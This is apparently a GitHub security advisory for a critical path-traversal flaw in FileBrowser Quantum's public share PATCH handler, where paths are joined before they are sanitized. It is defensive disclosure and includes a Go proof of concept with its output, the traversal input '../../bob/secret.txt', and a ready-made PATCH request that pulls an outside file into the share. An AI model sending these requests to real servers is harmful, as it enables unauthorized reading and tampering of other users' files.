# [C] FileBrowser Quantum: Path traversal in public share PATCH allows file ops outside shared directory

## Summary
Severity: Critical
Advisory: GHSA-qqqm-5547-774x
CVE: CVE-2026-48777
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-22
Source: https://github.com/advisories/GHSA-qqqm-5547-774x
Type: github-advisory

## Affected
- Go: `github.com/gtsteffaniak/filebrowser/backend` — affected >=0 <0.0.0-20260518193514-28e9b81e438e

## Details
## Summary

`publicPatchHandler` in `backend/http/public.go` joins user-controlled `fromPath` and `toPath` body fields with the trusted `d.share.Path` BEFORE the downstream sanitizer runs. Because `filepath.Join` collapses `..` segments during the join, the sanitizer in `resourcePatchHandler` never sees the traversal and the move/copy/rename operates on a path outside the shared directory. The same root-cause pattern was patched for the bulk DELETE endpoint as CVE-2026-44542 (GHSA-fwj3-42wh-8673), but the PATCH handler with the identical pattern was not updated.

A public share link with `AllowModify=true` is sufficient to exploit this. Anyone holding such a link can move, copy, or rename arbitrary files within the share owner's source root.

Verified on commit 869b640 (HEAD of `main` as of 2026-05-07).

## Details

In `backend/http/public.go` the public PATCH handler accepts a JSON body with `items[].fromPath` and `items[].toPath` from the client, then prepends the share path before delegating to `resourcePatchHandler`:

```go
// backend/http/public.go (publicPatchHandler)
for i := range req.Items {
    req.Items[i].FromSource = sourceName
    req.Items[i].FromPath   = utils.JoinPathAsUnix(d.share.Path, req.Items[i].FromPath) // line 372
    req.Items[i].ToSource   = sourceName
    req.Items[i].ToPath     = utils.JoinPathAsUnix(d.share.Path, req.Items[i].ToPath)   // line 374
}
d.Data = req
status, err := resourcePatchHandler(w, r, d)
```

`utils.JoinPathAsUnix` is a thin wrapper around `filepath.Join`, which
calls `filepath.Clean` and resolves `..` segments. By the time the
joined path reaches `resourcePatchHandler`, every `..` from the body
has been collapsed:

```go
// backend/http/resource.go (resourcePatchHandler)
cleanFromPath, err := utils.SanitizeUserPath(item.FromPath) // line 794
// ...
cleanToPath, err  := utils.SanitizeUserPath(item.ToPath)    // line 800
```

`SanitizeUserPath` (in `backend/common/utils/file.go`) checks for `..` segments after `filepath.Clean`. Since the join already cleaned the path, no `..` segment remains, the sanitizer returns success, and the move/copy/rename proceeds on the escaped target.

The share owner's user is substituted as the acting user for permission checks (`d.user = shareCreatedByUser`), so the access-control layer treats the request as if the share owner performed it. In a default configuration with no explicit access rules and `DenyByDefault=false`, `Access.Permitted` returns true for any path within the source, and the only remaining boundary is the source root itself (`idx.Path` in `Index.GetRealPath`).

The fix that landed for CVE-2026-44542 / GHSA-fwj3-42wh-8673 moved the sanitizer before the join in `resourceBulkDeleteHandler` (`backend/http/resource.go:274`) and in `withHashFileHelper` (`backend/http/middleware.go:57`). The PATCH variant in `public.go` follows the opposite order (join first, sanitize later) and was not updated.

For comparison, the same file's `publicPutHandler` uses the safe order:

```go
// backend/http/public.go (publicPutHandler) -- safe order
cleanPath, err := utils.SanitizeUserPath(path)         // sanitize FIRST
if err != nil { return http.StatusBadRequest, err }
resolvedPath := utils.JoinPathAsUnix(d.share.Path, cleanPath) // then join
```

## PoC

The bug reproduces deterministically with the project's own helpers, without needing the full server. The Go program below uses verbatim copies of `SanitizeUserPath` (from `backend/common/utils/file.go`) and `JoinPathAsUnix` (from `backend/common/utils/main.go`) and replays the exact sequence executed for one item in `publicPatchHandler` followed by `resourcePatchHandler`.

```go
package main

import (
    "fmt"
    "path/filepath"
    "runtime"
    "strings"
)

// Verbatim from backend/common/utils/file.go
func SanitizeUserPath(userPath string) (string, error) {
    clean := filepath.Clean(userPath)
    for _, segment := range strings.Split(clean, string(filepath.Separator)) {
        if segment == ".." {
            return "", fmt.Errorf("invalid path: path traversal detected")
        }
    }
    if clean == "." {
        return "", fmt.Errorf("invalid path: path must standard index path")
    }
    return clean, nil
}

// Verbatim from backend/common/utils/main.go
func JoinPathAsUnix(parts ...string) string {
    p := filepath.Join(parts...)
    if runtime.GOOS == "windows" {
        p = strings.ReplaceAll(p, "\\", "/")
    }
    return p
}

func main() {
    sharePath := "/users/alice/shared/" // d.share.Path (server-controlled)
    attackerInput := "../../bob/secret.txt"

    // publicPatchHandler line 372: join BEFORE sanitize
    joined := JoinPathAsUnix(sharePath, attackerInput)

    // resourcePatchHandler line 794: sanitize the already-joined path
    sanitized, err := SanitizeUserPath(joined)

    fmt.Printf("attacker input: %q\n", attackerInput)
    fmt.Printf("after join:     %q\n", joined)
    fmt.Printf("sanitizer err:  %v\n", err)
    fmt.Printf("sanitized path: %q\n", sanitized)
}
```

Output:

```
attacker input: "../../bob/secret.txt"
after join:     "/users/bob/secret.txt"
sanitizer err:  <nil>
sanitized path: "/users/bob/secret.txt"
```

The path `/users/bob/secret.txt` is outside the share root `/users/alice/shared/` and is the value passed to `Index.GetRealPath` which resolves to `<source-root>/users/bob/secret.txt`. The downstream move/copy/rename then targets that file. The same input is rejected by `SanitizeUserPath` if the order is reversed (sanitize-then-join), which is the order used by `publicPutHandler` and the post-fix bulk DELETE.

End-to-end exploit request shape:

```
PATCH /public/api/resources?hash=<share-hash> HTTP/1.1
Content-Type: application/json

{
  "action": "rename",
  "items": [
    {
      "fromSource": "default",
      "fromPath":   "../../bob/secret.txt",
      "toSource":   "default",
      "toPath":     "stolen.txt"
    }
  ]
}
```

After the request, `stolen.txt` exists inside the shared directory and is downloadable through the same public share, exfiltrating the file that was outside the share's intended scope.

## Impact

An unauthenticated attacker who possesses a public share link with `AllowModify=true` can move, copy, or rename any file inside the share owner's source root, escaping the share's intended directory. Two practical exploitation patterns:

1. Read arbitrary files in the source root: rename a file from outside the shared directory to a location inside it, then download it through the share. This breaks confidentiality of any file the share owner can read.

2. Tamper with arbitrary files in the source root: move an attacker-controlled file (uploaded into the share) over the top of a victim file. This breaks integrity of files the share owner can write to (configuration files, dotfiles, web roots if the source includes them).

Scope is bounded by the source root rather than the shared directory, which is the same boundary class as CVE-2026-44542 (GHSA-fwj3-42wh-8673, CVSS 9.1). The remediation pattern is the same: sanitize first, then join. The fix is a one-spot change in `publicPatchHandler` to call `SanitizeUserPath` on `req.Items[i].FromPath` and `req.Items[i].ToPath` before the two `JoinPathAsUnix(d.share.Path, ...)` calls.

## References
- https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-qqqm-5547-774x
- https://github.com/gtsteffaniak/filebrowser
